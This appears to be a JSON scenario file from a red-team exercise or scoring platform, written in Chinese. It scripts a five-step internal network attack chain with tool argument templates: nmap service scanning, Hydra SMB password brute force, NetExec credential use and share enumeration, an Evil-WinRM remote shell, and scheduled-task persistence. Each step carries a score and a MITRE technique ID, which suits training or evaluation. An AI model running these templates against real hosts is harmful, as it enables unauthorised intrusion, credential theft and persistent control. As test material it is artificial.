{
  "id": "credential_to_lateral",
  "name": "凭据窃取→载荷投递→横向移动→持久化",
  "description": "演示完整的内网攻击链：hydra 暴力破解获取凭据 → netexec 验证并横向移动 → evil-winrm 投递持久化载荷。每个步骤绑定对应载荷，完整展示'载荷生成→加工→攻击'在内网渗透中的应用。",
  "category": "lateral-movement",
  "difficulty": "medium",
  "estimatedMinutes": 12,
  "baseline_group": "internal-network-exploitation",
  "targetType": ["windows_host", "ad_domain"],
  "steps": [
    {
      "id": "step1_recon",
      "name": "侦察 — 端口扫描发现服务",
      "toolId": "nmap",
      "payload_id": "port-scan",
      "argsTemplate": ["-sV", "-p", "22,135,139,445,3389,5985", "--open", "-Pn", "{{host}}"],
      "description": "扫描目标开放端口，发现 SMB(445)、WinRM(5985) 等可利用服务",
      "score": 10,
      "expectedMitre": ["T1046"]
    },
    {
      "id": "step2_brute_force",
      "name": "凭据窃取 — Hydra 暴力破解",
      "toolId": "hydra",
      "payload_id": "auth-brute",
      "argsTemplate": ["-l", "{{username}}", "-P", "/usr/share/wordlists/common_passwords.txt", "smb://{{host}}"],
      "description": "使用 Hydra 对 SMB 服务进行暴力破解，获取有效凭据",
      "score": 20,
      "expectedMitre": ["T1110"]
    },
    {
      "id": "step3_lateral_smb",
      "name": "横向移动 — NetExec SMB 枚举",
      "toolId": "netexec",
      "payload_id": "pass-the-hash",
      "argsTemplate": ["smb", "{{host}}", "-u", "{{username}}", "-p", "{{password}}", "--shares"],
      "description": "使用获取的凭据通过 SMB 横向移动，枚举共享资源",
      "score": 20,
      "expectedMitre": ["T1021.002"]
    },
    {
      "id": "step4_winrm_shell",
      "name": "载荷投递 — Evil-WinRM 远程 Shell",
      "toolId": "evil-winrm",
      "payload_id": "lateral-winrm",
      "argsTemplate": ["-i", "{{host}}", "-u", "{{username}}", "-p", "{{password}}"],
      "description": "通过 WinRM 投递远程管理载荷，获取交互式 Shell。这是'载荷投递→攻击'的关键步骤。",
      "score": 25,
      "expectedMitre": ["T1021.006"]
    },
    {
      "id": "step5_persistence",
      "name": "持久化 — 计划任务植入",
      "toolId": "evil-winrm",
      "payload_id": "lateral-winrm",
      "argsTemplate": ["-i", "{{host}}", "-u", "{{username}}", "-p", "{{password}}", "-s", "/opt/redteam/scripts/persistence-demo.ps1"],
      "description": "通过远程 Shell 植入计划任务实现持久化，演示载荷加工后的持续控制能力",
      "score": 15,
      "expectedMitre": ["T1053.005"]
    }
  ]
}
